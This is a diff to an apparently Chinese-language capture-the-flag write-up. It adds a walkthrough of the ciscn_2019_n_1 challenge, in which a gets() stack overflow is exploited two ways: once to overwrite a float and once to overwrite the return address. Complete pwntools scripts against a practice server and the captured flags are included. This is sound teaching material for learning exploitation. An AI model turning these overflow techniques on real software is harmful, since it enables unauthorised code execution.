@@ -124,14 +124,12 @@ int fun()
 
 注意到shellcode位于`40118A`，所以我们要让其执行这个地址的命令。
 
-那么如何溢出呢？首先要填满`s[15]`，也就是15个字节，与此同时，还需要添加8个字节来顶掉保存字节`push rbp;`：
+那么如何溢出呢？首先要填满`s[15]`，也就是15个字节，与此同时，还需要添加8个字节来顶掉基指针寄存器`rbp;`：
 
-> 每个函数调用都会在栈上保存前一个函数的RBP值
-
-> 这个保存操作占用固定的8字节空间
-
-> 在缓冲区溢出攻击中，这8字节是覆盖返回地址前必须越过的最后一个屏障
-
+> rbp (Base Pointer Register) 是x86-64架构中的基指针寄存器,用于标记当前函数栈帧的起始位置
+> 每个函数调用都会在栈上保存前一个函数的RBP值 ,
+> 这个保存操作占用固定的8字节空间,
+> 在缓冲区溢出攻击中，这8字节是覆盖返回地址前必须越过的最后一个屏障,
 > x86架构是4字节，x64架构是8字节 → 这是64位系统的关键特征
 
 所以构建payload：
@@ -261,7 +259,7 @@ timeout: the monitored command dumped core
 [*] Got EOF while reading in interactive
 ````
 
-不过这道题其实应该不是这样做的。。因为主函数里`sprintf(s, "%p\n", sub_40060D)`是用来打印出shellcode函数地址的，但是它的`PIE`未启用，也就是每次的地址都是固定的，这个语句就毫无意义了。
+不过这道题其实应该不是这样做的。。因为主函数里`sprintf(s, "%p\n", sub_40060D)`是用来打印出shellcode函数地址的，也就是泄露地址，但是它的`PIE`未启用，也就是每次的地址都是固定的，这个语句就毫无意义了。
 
 所以应该是这样的：
 
@@ -298,3 +296,177 @@ timeout: the monitored command dumped core
 [*] Interrupted
 [*] Closed connection to node5.buuoj.cn port 29765
 ````
+
+## ciscn_2019_n_1
+
+和上面一样：
+
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols        No    0               1               /home/wuko233/Desktop/pwn/
+```
+
+`main`:
+
+```cpp
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  func();
+  return 0;
+}
+```
+
+`func`:
+
+```cpp
+int func()
+{
+  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
+  float v2; // [rsp+2Ch] [rbp-4h]
+
+  v2 = 0.0;
+  puts("Let's guess the number.");
+  gets(v1);
+  if ( v2 == 11.28125 )
+    return system("cat /flag");
+  else
+    return puts("Its value should be 11.28125");
+}
+```
+
+分析一下，shellcode必须满足v2值为11.28125，所以需要通过`gets()`溢出来改变v2的值。
+
+注意到：
+
+```cpp
+  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
+  float v2; // [rsp+2Ch] [rbp-4h]
+```
+
+在`v1`的定义下就是`v2`，所以可以溢出v1来修改v2的值。
+
+v1长度为44，v2长度为4(float)。(byte)
+
+这里补个笔记，长度判断也可以靠后面反编译的注释：
+
+v1起始点：`rbp-30h`
+
+v2起始点：`rbp-4h`
+
+所以v1长度就是`0x30(48)-0x4(4)=44`
+
+溢出v1还是和上面一样：`'q'*44`
+
+接下来的主要问题是给v2赋值11.28125：
+
+肯定是不能直接传进这个数的，因为它是浮点，我们需要传入字节，所以可以用`struct`库：
+
+> Struct 模块用于在字节字符串和 Python 原生数据类型之间进行转换。它可以将 Python 数据打包成二进制数据，或将二进制数据解包成 Python 数据。
+
+> struct.pack() 函数可以将数据打包成二进制格式。格式字符串指定了数据的类型和顺序。
+
+```python
+import struct
+
+num = 11.28125
+num2byte = struct.pack("f", num) # float类型转byte
+print(f"{num} 转换结果：{num2byte}")
+
+# 11.28125 转换结果：b'\x00\x804A'
+```
+
+综上可得payload:
+
+```python
+num = 11.28125
+num2byte = struct.pack("f", num)
+print(f"{num} 转换结果：{num2byte}")
+payload = b'q'*44 + num2byte
+```
+
+总体：
+
+```python
+from pwn import *
+import struct
+
+host = "node5.buuoj.cn"
+port = 25333
+
+sh = remote(host, port)
+
+num = 11.28125
+num2byte = struct.pack("f", num)
+print(f"{num} 转换结果：{num2byte}")
+payload = b'q'*44 + num2byte
+print(sh.recvuntil("Let's guess the number."))
+sh.sendline(payload)
+sh.interactive()
+```
+
+拿到flag：
+
+```
+b"Let's guess the number."
+[*] Switching to interactive mode
+
+flag{3214184b-a04b-419e-b114-52e08022514e}
+[*] Got EOF while reading in interactive
+```
+
+主包主包，float转byte还是太麻烦，有没有更**简单粗暴**一点的方法？有的兄弟，有的：
+
+```cpp
+  gets(v1);
+  if ( v2 == 11.28125 )
+    return system("cat /flag");
+```
+
+既然你源码里有`system("cat /flag")`，那我们可不可以直接覆盖到这个shellcode的地址，直接执行shellcode？答案是肯定的！
+
+先来查查shellcode地址：
+
+```asm
+.text:00000000004006BE                 mov     edi, offset command ; "cat /flag"
+```
+
+得到地址：`0x4006BE`；
+
+已知v1长44，v2长4，旧rbp长8，那我问你，需要顶掉多少byte？没错，也就是44+4+8=56！
+
+再来构建payload:
+
+```python
+payload = b'q'*56 + p64(0x4006BE)
+```
+
+EZ，拿到了！
+
+```
+b"Let's guess the number."
+[*] Switching to interactive mode
+
+Its value should be 11.28125
+flag{47e47e55-73c9-4c29-98cc-8e3e879669ec}
+timeout: the monitored command dumped core
+[*] Got EOF while reading in interactive
+```
+
+完整脚本：
+
+```python
+from pwn import *
+import struct
+
+host = "node5.buuoj.cn"
+port = 26748
+
+sh = remote(host, port)
+
+payload = b'q'*56 + p64(0x4006BE)
+print(sh.recvuntil("Let's guess the number."))
+sh.sendline(payload)
+sh.interactive()
+```
